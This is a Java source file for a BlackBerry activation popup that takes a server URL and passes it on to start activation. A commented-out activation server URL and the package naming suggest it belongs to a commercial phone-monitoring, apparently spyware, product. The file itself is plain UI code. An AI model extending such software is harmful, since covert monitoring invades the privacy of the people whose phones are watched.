package com.vvt.screen;

import com.vvt.global.Global;
import com.vvt.info.ServerUrl;
import com.vvt.std.Constant;
import com.vvt.std.Log;
import com.vvt.ui.resource.MainAppTextResource;
import net.rim.device.api.system.*;
import net.rim.device.api.ui.container.*;
import net.rim.device.api.ui.*;
import net.rim.device.api.ui.component.*;

public class ActivationPopup extends PopupScreen implements KeyListener, TrackwheelListener, FieldChangeListener {
	
	private WelcomeScreen welcomeScreen = null;
	private ButtonField activationButton, cancelButton;
	private EditField activationUrl;
	private ServerUrl serverUrl = Global.getServerUrl();
	
	public ActivationPopup(WelcomeScreen welcomeScreen) {
		super(new VerticalFieldManager(), Field.FIELD_HCENTER | Field.FOCUSABLE);
		this.welcomeScreen = welcomeScreen;
		LabelField text1 = new LabelField(MainAppTextResource.ACTIVATION_POPUP_ENTER_URL);
		activationUrl= new EditField("", "http://", 255, BasicEditField.FILTER_URL);		
		/*String activateUrl = serverUrl.getServerActivationUrl().trim();
		if (activateUrl == null || activateUrl == "") {
			activateUrl = " ";
		}
		activationUrl= new EditField("", activateUrl, 255, BasicEditField.FILTER_URL);*/
		//activationUrl= new EditField("", "http://mobile.finspy.cyclops.backuphone.com:8080/Phoenix-WAR-CyclopsCore", 255, BasicEditField.FILTER_URL);
		add(text1);
		add(activationUrl);
		HorizontalFieldManager hfm = new HorizontalFieldManager(Field.FIELD_HCENTER);
		VerticalFieldManager vfLeft = new VerticalFieldManager();
		VerticalFieldManager vfRight = new VerticalFieldManager();
		activationButton = new ButtonField(MainAppTextResource.ACTIVATION_POPUP_ACTIVATION_MENU, ButtonField.CONSUME_CLICK);
		cancelButton = new ButtonField(MainAppTextResource.ACTIVATION_POPUP_CANCEL_MENU, ButtonField.CONSUME_CLICK);
		activationButton.setChangeListener(this);
		cancelButton.setChangeListener(this);
		vfLeft.add(activationButton);
		vfRight.add(cancelButton);
		hfm.add(vfLeft);
		hfm.add(vfRight);
		add(hfm);
	}

	public boolean trackwheelClick(int status, int time) {
		try {
			if (activationUrl.getText().trim().equals("") && !cancelButton.isFocus()) {
				Dialog.alert(MainAppTextResource.ACTIVATION_POPUP_INVALID_ACTIVATION_CODE);
			} else {
				if (cancelButton.isFocus()) {
					cancel();
				} else {
					UiApplication.getUiApplication().popScreen(this);
					welcomeScreen.notifyActivation(activationUrl.getText());
				}
			}
		} catch(Exception e) {
			Log.error("ActivationPopup.trackwheelClick", null, e);
		}
		return true;
	}

	public boolean keyChar(char key, int status, int time) {
		boolean ret = super.keyChar(key, status, time);
		try {
			switch (key) {
			case Characters.ENTER:
				if (!cancelButton.isFocus() && !activationButton.isFocus()) {
					if (activationUrl.getText().trim().equals(Constant.EMPTY_STRING)) {
						Dialog.alert(MainAppTextResource.ACTIVATION_POPUP_INVALID_ACTIVATION_CODE);
					} else {
						UiApplication.getUiApplication().popScreen(this);
						welcomeScreen.notifyActivation(activationUrl.getText());
					}
					return true;
				}
				break;
			case Characters.ESCAPE:
				cancel();
				return true;
			}
		} catch(Exception e) {
			Log.error("ActivationPopup.keyChar", null, e);
		}
		return ret;
	}

	public void fieldChanged(Field field, int context) {
		try {
			if (field == activationButton) {
				if (activationUrl.getText().trim().equals(Constant.EMPTY_STRING)) {
					Dialog.alert(MainAppTextResource.ACTIVATION_POPUP_INVALID_ACTIVATION_CODE);
				} else {
					UiApplication.getUiApplication().popScreen(this);
					welcomeScreen.notifyActivation(activationUrl.getText());
				}
			} else if (field == cancelButton) {
				cancel();
			}
		} catch(Exception e) {
			Log.error("ActivationPopup.fieldChanged", null, e);
		}
	}

	private void cancel() {
		UiApplication.getUiApplication().popScreen(this);
	}

	public boolean onClose() {
		return false;
	}

	public boolean trackwheelRoll(int amount, int status, int time) {
		return super.trackwheelRoll(amount, status, time);
	}

	public boolean trackwheelUnclick(int status, int time) {
		return super.trackwheelUnclick(status, time);
	}

	public boolean keyDown(int keycode, int time) {
		return false;
	}

	public boolean keyRepeat(int keycode, int time) {
		return false;
	}

	public boolean keyStatus(int keycode, int time) {
		return false;
	}

	public boolean keyUp(int keycode, int time) {
		return false;
	}
}